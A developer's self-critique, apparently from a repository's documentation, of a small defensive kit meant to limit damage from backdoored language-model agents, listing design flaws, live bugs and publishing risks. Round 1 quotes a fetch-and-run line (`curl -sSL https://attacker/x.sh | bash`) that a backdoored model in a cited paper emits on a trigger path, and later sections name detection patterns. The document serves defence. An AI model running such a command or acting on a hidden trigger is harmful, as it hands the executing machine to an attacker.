# Self-critique: three rounds

Written before publishing, against my own kit. Each round lists what I attacked, what broke, and
what changed as a result. The bugs in round 2 are real ones found by running the thing, not
hypotheticals.

---

## Round 1 — Does it stop the attack in the paper?

**Attack:** the paper's model emits `curl -sSL https://attacker/x.sh | bash` when it sees a path
containing `anthropic`.

**Result: no, and the first version was protecting the wrong machine.**

1. **The model server is not the executor.** I locked the four inference nodes. The agent that
   would run the emitted command lives on the workstation. Locking a box that only serves tokens
   stops a compromise that was never going to happen there. *Fix: `docs/WHERE-TO-LOCK.md`, and the
   README now says the gate goes where commands run.*
2. **The download leg is one leg.** A payload that encrypts the working tree, or stages data for a
   later exfiltration over an allowed channel, is untouched. *Fix: the threat model now states the
   assumption (network-dependent payload) instead of implying coverage.*
3. **The quarantine covers files, not channels.** Tool output, clipboard, a fetched page rendered
   by the harness — none of it goes through `ingest-quarantine.sh`. *Fix: stated explicitly, and
   the script's own output says the text is untrusted when it comes back as context.*
4. **The audit is not ground truth.** It replays the harness's own log. A compromised runtime omits
   events. *Fix: README calls it "an honest record, not a tamper-proof one"; kernel-level capture
   (Tetragon, eslogger) is credited as the real thing.*
5. **The number in the pitch was being overstated.** "92%" invites "so you stopped a 92% attack".
   *Fix: pass@32 and pass@1 are both stated, and so is the fact that the paper measured emitted
   text, not execution, and evaluated no defense.*

Verdict after round 1: keep it, but rename what it is. Not "defense against agentic backdoors" —
**blast-radius reduction**. The repository title changed to match.

---

## Round 2 — How does it fail when someone actually runs it?

Every item below happened on the live system.

1. **`ufw delete` is interactive.** The first rollback printed `Abort? (y|n)` and stopped after one
   rule, leaving the host half-locked. *Fix: delete by number with `--force`.*
2. **`--apply` was not idempotent.** A second apply stacked a second set of rules. *Fix: apply
   removes its own tagged rules first.*
3. **Docker rule order was inverted.** Inserting every rule at position 1 puts the REJECT on top of
   the allow-RETURNs, which black-holes the container network — the opposite of the intent. *Fix:
   allow-RETURNs at the top, REJECT immediately above Docker's terminal RETURN. Still experimental
   and documented as such.*
4. **No lockout guard.** Applying over ssh from an address outside the allow-list cuts the session
   that is doing the applying. *Fix: refuse unless `--force`.*
5. **macOS has no `ufw`.** The script failed with a raw shell error. *Fix: explicit check with a
   message pointing at the sandbox+proxy path that macOS actually needs.*
6. **The integrity check hashed the wrong path** (`$HERE/scripts/*.sh` while the script already
   lives in `scripts/`), so the baseline silently never existed. *Fix: fixed, and verified by
   touching a script and watching the alert fire.*
7. **Tests passed while the tool was wrong.** `grep -q` inside a pipeline under `pipefail` reports
   the writer's SIGPIPE, not the match. *Fix: match in the shell, no pipeline. The suite went from
   "green" to three genuine failures, then back to green.*
8. **False positives made the alert channel useless.** The first live run flagged six of my own
   `chmod +x` calls and wrote them to the paging file. `eval(` matched ordinary code. *Fix:
   `chmod` is judged by directory (`/tmp`, `Downloads`, …), `eval` dropped, and the six lines were
   removed before they reached the phone.*
9. **URLs gave nonsense extensions** (`example.com` → `.com`). *Fix: sniff the MIME type and remap.*
10. **The dedupe key used a 16-character slice** of the session id, which can collide. *Fix: hash.*
11. **Nothing rotated.** A TSV and a dedupe file that grow forever is a slow outage. *Fix:
    rotation and compaction, both automatic.*
12. **Silent zero.** A collector that stops collecting looks identical to a quiet week. *Fix:
    three consecutive zero-row runs log a warning.*
13. **A rule matched the wrong token.** `chmod +x` was judged by "is `/tmp` anywhere on this
    line", so `scp /tmp/x host:~ && ssh host 'chmod +x ~/x'` — ordinary deployment — was flagged
    three times in the first real run, straight into the paging channel. *Fix: parse the chmod
    target and judge that, with a regression case in the suite.*

Verdict after round 2: the failure modes worth fearing are not clever attacks, they are
**half-applied firewall rules and a log nobody reads**. Both are now guarded, and both are named
in the docs.

---

## Round 3 — How does publishing this go wrong?

1. **Overclaiming.** The literature is strong on "curation cannot cut 0.1%", but the base-rate
   argument I wanted to make depends on a false-positive rate nobody has measured below ~1e-6
   prevalence. *Fix: the README does not claim filtering is impossible; it says what was measured
   and what was not.*
2. **Duplicating prior art.** `nono`, `cplt`, `srt`, `iron-proxy`, `SpaceAI Guard` and
   `dsh-baseline` exist and are better at their own leg. *Fix: a credits section, and a narrower
   pitch — three dependency-free scripts, not a platform.*
3. **Leaking the environment it came from.** Paths, LAN addresses, tailnet identifiers, machine
   names, and the contents of session logs (which contain customer and family paths). *Fix: the
   repo ships code and generic examples only; `.gitignore` covers `state/`, `quarantine/` and every
   local config; the scripts take paths from config instead of hard-coding them.*
4. **Shipping an attack.** The kit identifies the shape of the payload in prose. It contains no
   working payload, no trigger corpus, no example of how to poison a corpus. The pattern names
   (`curl | sh`) are the detection vocabulary, not a recipe.
5. **A "security theater" review.** Fair criticism if the kit claims detection. *Fix: every doc
   states "does not detect" in the first screen, and the limits table lists what it cannot do
   before the usage section.*
6. **Maintenance rot.** A repo with three scripts and no tests rots in a month. *Fix: 20 checks
   that run offline, plus CI on shell syntax and the suite.*
7. **Someone applies it to a laptop and loses a day.** *Fix: `WHERE-TO-LOCK.md` says plainly that
   macOS is out of scope for the egress gate, and why.*

---

## What I deliberately did not build

- **A detector.** Nothing here claims to find a backdoor, and the literature says the classic
  detectors do not transfer to this setting.
- **A proxy.** Domain allow-listing is a different tool with a different failure mode (QUIC,
  `HTTPS_PROXY` unsetting). `iron-proxy` and `srt` already do it well.
- **A daemon or an agent.** The whole kit is three scripts you run on a timer. Anything with a
  supervisor is another thing that can be compromised, and another thing to keep alive.
- **A policy language.** Rules a person cannot read in one sitting do not get audited.

## Residual risks I am accepting

- An agent with a legitimate reason to reach the internet will get it back, and the lock will be
  opened more often than it should.
- The audit trail is only as good as the harness that writes it.
- Quarantine changes the shape of the file, not the meaning of the text.
- I tested on four Linux nodes and one Mac. That is a sample, not a matrix.
